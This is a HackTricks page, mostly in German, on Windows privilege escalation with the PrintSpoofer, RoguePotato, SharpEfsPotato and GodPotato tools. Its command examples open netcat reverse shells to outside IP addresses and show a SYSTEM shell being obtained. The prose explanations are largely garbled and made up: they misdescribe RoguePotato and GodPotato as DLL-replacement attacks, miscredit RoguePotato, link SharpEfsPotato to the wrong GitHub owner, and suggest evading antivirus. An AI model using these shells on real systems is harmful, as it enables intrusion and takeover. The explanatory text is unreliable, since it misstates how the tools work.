# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

{% hint style="warning" %}
**JuicyPotato funktioniert nicht** auf Windows Server 2019 und Windows 10 Build 1809 und höher. Jedoch können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) verwendet werden, um **die gleichen Berechtigungen auszunutzen und Zugriff auf `NT AUTHORITY\SYSTEM`** zu erlangen. Dieser [Blog-Beitrag](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) geht detailliert auf das Tool `PrintSpoofer` ein, das zum Missbrauch von Impersonationsberechtigungen auf Windows 10- und Server 2019-Hosts verwendet werden kann, auf denen JuicyPotato nicht mehr funktioniert.
{% endhint %}

## Schnelle Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
RoguePotato ist eine Windows-Exploit-Technik, die es einem Angreifer ermöglicht, lokale Administratorrechte auf einem Zielcomputer zu erlangen. Es nutzt eine Schwachstelle im COM-Sicherheitsmodell aus, um eine Verbindung zu einem bösartigen COM-Objekt herzustellen. Sobald die Verbindung hergestellt ist, kann der Angreifer Code mit erhöhten Rechten ausführen und somit die Kontrolle über das System übernehmen.

Die RoguePotato-Technik basiert auf der Kombination von zwei Schwachstellen: der COM-DLL-Hijacking-Schwachstelle und der DCOM-Objektaktivierungsschwachstelle. Durch Ausnutzen dieser Schwachstellen kann ein Angreifer eine bösartige DLL-Datei in einem vertrauenswürdigen Verzeichnis platzieren und diese dann von einem privilegierten Prozess geladen lassen. Sobald die DLL-Datei geladen ist, kann der Angreifer Code mit erhöhten Rechten ausführen.

Um RoguePotato erfolgreich auszuführen, muss der Angreifer über lokale Administratorrechte auf dem Zielcomputer verfügen. Es ist auch wichtig zu beachten, dass RoguePotato von einigen Antivirenprogrammen erkannt werden kann, da es eine bekannte Exploit-Technik ist. Daher ist es ratsam, zusätzliche Maßnahmen zu ergreifen, um die Erkennung zu umgehen, wie z.B. die Verwendung von Anti-Viren-Ausnahmen oder das Ändern des Exploit-Codes.

Es gibt verschiedene Tools und Frameworks, die RoguePotato automatisieren und den Exploit-Prozess vereinfachen können. Ein bekanntes Tool ist "RoguePotato" von James Forshaw, das auf der ursprünglichen RoguePotato-Technik basiert. Es ist wichtig zu beachten, dass die Verwendung solcher Tools und Frameworks nur zu Test- und Bildungszwecken empfohlen wird und nicht für illegale Aktivitäten verwendet werden sollte.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service to achieve local privilege escalation on Windows systems. It leverages the RoguePotato technique, which takes advantage of the PrintSpoofer vulnerability to escalate privileges.

To use SharpEfsPotato, follow these steps:

1. Download the tool from the [GitHub repository](https://github.com/itm4n/SharpEfsPotato).
2. Compile the source code using Visual Studio or use the precompiled binary.
3. Execute the tool with administrative privileges on the target system.
4. SharpEfsPotato will attempt to exploit the EFS service and escalate privileges to SYSTEM.
5. If successful, you will have elevated privileges on the system.

It's important to note that the RoguePotato technique relies on the PrintSpoofer vulnerability, which allows an attacker to impersonate the Print Spooler service and execute arbitrary code with SYSTEM privileges. This vulnerability has been patched by Microsoft, so it may not work on fully updated systems.

Keep in mind that using SharpEfsPotato or any other hacking tool without proper authorization is illegal and unethical. Always ensure you have the necessary permissions and legal rights before attempting any hacking activities.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a technique that allows an attacker to escalate their privileges on a Windows system by exploiting the Print Spooler service. This technique takes advantage of the fact that the Print Spooler service runs with SYSTEM privileges, allowing an attacker to execute arbitrary code with the highest level of access.

To perform a GodPotato attack, the attacker needs to have local administrator privileges on the target system. The attack involves replacing a legitimate DLL file used by the Print Spooler service with a malicious one. When the service is restarted, it will load the attacker's DLL, which can then be used to execute code with SYSTEM privileges.

The first step in a GodPotato attack is to identify a vulnerable version of the Print Spooler service. This can be done by checking the version number of the spoolsv.exe file, which is located in the System32 directory. If the version number is lower than 10.0.19041.488, the system is vulnerable to the attack.

Once a vulnerable version is identified, the attacker needs to create a malicious DLL file. This file should contain the code that the attacker wants to execute with SYSTEM privileges. The DLL file should be named after a legitimate DLL used by the Print Spooler service, such as "localspl.dll" or "spoolss.dll".

Next, the attacker needs to replace the legitimate DLL file with their malicious DLL file. This can be done by stopping the Print Spooler service, renaming the original DLL file, and then copying the malicious DLL file to the same location. Finally, the Print Spooler service can be restarted to load the attacker's DLL.

Once the attacker's DLL is loaded, they can execute arbitrary code with SYSTEM privileges. This can be used to perform various malicious activities, such as installing backdoors, stealing sensitive information, or modifying system configurations.

It is important to note that GodPotato is a high-risk technique that can have serious consequences. It should only be used in controlled environments for legitimate purposes, such as penetration testing or security research.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Referenzen
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
